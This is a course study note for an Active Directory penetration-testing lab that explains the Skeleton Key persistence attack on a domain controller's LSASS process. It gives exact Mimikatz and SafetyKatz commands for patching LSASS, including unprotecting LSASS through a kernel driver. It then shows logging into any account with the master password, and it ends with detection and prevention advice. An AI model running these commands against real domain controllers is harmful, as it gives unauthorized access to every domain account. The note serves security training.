# Skeleton Key — LSASS Persistence Attack

**Date:** 04 August 2026


---

## What is Skeleton Key?

A persistence technique that patches the LSASS process on a Domain Controller.

**Effect:** Any domain user can authenticate using a **single password** (typically "mimikatz").

```
Normal auth:  username + correct_password → Success
With Skeleton Key:  ANY_username + "mimikatz" → Success
```

---

## Key Characteristics

❌ **Very Noisy** — heavily monitored, easily detected  
❌ **Not Persistent** — reboots remove the patch  
❌ **Not OPSEC Safe** — should avoid in real engagements  
❌ **Breaks AD CS** — can cause issues with certificate services  
✅ **Domain Admin only** — requires DA privileges  

---

## Prerequisites

- **Domain Admin privileges**
- **Code execution on Domain Controller**
- **SafetyKatz.exe** (Mimikatz variant) or direct Mimikatz access
- **Local admin on DC** (implied by DA)

---

## Attack: Normal LSASS (Unprotected)

**Step 1: Inject Skeleton Key on DC**

```powershell
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

**Parameters:**
- `privilege::debug` — Enable debug privilege (required for LSASS modification)
- `misc::skeleton` — Inject skeleton key patch
- `-ComputerName` — Target DC

**Result:** LSASS patched. Any user can now authenticate with password "mimikatz".

---

## Step 2: Access Any User Account

```powershell
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
```

When prompted for password, enter: `mimikatz`

Access granted as Administrator (or any domain user).

---

## Attack: Protected LSASS (Harder)

**Prerequisites:**
- LSASS running as protected process
- Mimikatz driver (mimidriv.sys) on disk
- Direct mimikatz access (not SafetyKatz)

**Step 1: Load Mimikatz**

```
mimikatz # privilege::debug
```

Enable debug privilege.

**Step 2: Load Driver**

```
mimikatz # !+
```

Load mimidriv.sys kernel-mode driver.

**Step 3: Remove LSASS Protection**

```
mimikatz # !processprotect /process:lsass.exe /remove
```

Unprotect LSASS process.

**Step 4: Inject Skeleton Key**

```
mimikatz # misc::skeleton
```

Inject patch into unprotected LSASS.

**Step 5: Restore Driver**

```
mimikatz # !-
```

Unload driver.

---

## Why Protected LSASS Version is EXTREMELY Noisy

⚠️ **Service Installation** — kernel-mode driver installation logged  
⚠️ **Driver Load/Unload** — system events generated  
⚠️ **LSASS Protection Removal** — process modification audited  
⚠️ **Multiple Privilege Escalations** — detected by EDR  

**Result:** Lights up monitoring systems like Christmas tree.

---

## How Skeleton Key Works (Technical)

```
LSASS receives authentication request
  ↓
Normal flow: Verify password hash
  ↓
Skeleton Key patch intercepts:
  ↓
"Is password 'mimikatz'?" → YES → Allow
"Is password correct for user?" → Bypassed
  ↓
Authentication succeeds for any user
```

---

## Access Patterns After Skeleton Key

```powershell
# Access as Administrator
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
# Password: mimikatz

# Access as any other user
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\SomeServiceAccount
# Password: mimikatz

# Access as domain admin (still works)
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\krbtgt
# Password: mimikatz
```

---

## Skeleton Key vs Other Persistence

| Technique | Duration | OPSEC | Scope |
|---|---|---|---|
| Skeleton Key | Until reboot | Very noisy | DC only |
| Golden Ticket | 10+ hours | Good | Entire domain |
| Backdoor account | Indefinite | Good | Entire domain |
| Forged cert | Indefinite | Good | Entire domain |

---

## Why Skeleton Key is Bad Choice

❌ **Not persistent** — reboots destroy it  
❌ **Extremely noisy** — detected immediately  
❌ **Breaks systems** — causes AD CS issues  
❌ **Easy to detect** — LSASS modification is obvious  
❌ **Creates artifact** — if using driver, service installation logged  

**Better alternatives:**
- Golden Ticket (persistent + less noisy)
- Forged certificates (persistent + OPSEC safe)
- Backdoor account (persistent + normal-looking)

---

## When Skeleton Key Fails

1. **LSASS crashes** — DC becomes unstable
2. **AD CS breaks** — certificate authentication fails
3. **Reboot occurs** — patch removed automatically
4. **EDR detects** — driver installation triggers alert
5. **Admin finds it** — anomalous process behavior

---

## Why It's Included in CRTP

Skeleton Key is included to demonstrate:
- LSASS as critical target
- Direct process memory modification
- Why OPSEC matters
- Better alternatives exist
- Persistence doesn't mean safe

---

## Detection & Prevention

**Detection:**
- Monitor LSASS modifications
- Alert on unusual authentication patterns
- Check for mimidriv.sys on disk
- Monitor service installations on DCs

**Prevention:**
- Use virtualization/hypervisors to protect LSASS
- Enable LSA protection (built-in)
- Monitor domain authentication
- Regular security audits

---

## References

- [Mimikatz - Skeleton Key](https://github.com/gentilkiwi/mimikatz)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [LSASS Protection (Microsoft)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

---

*Next: Learning Objective 11 — Cross-Forest Attacks*
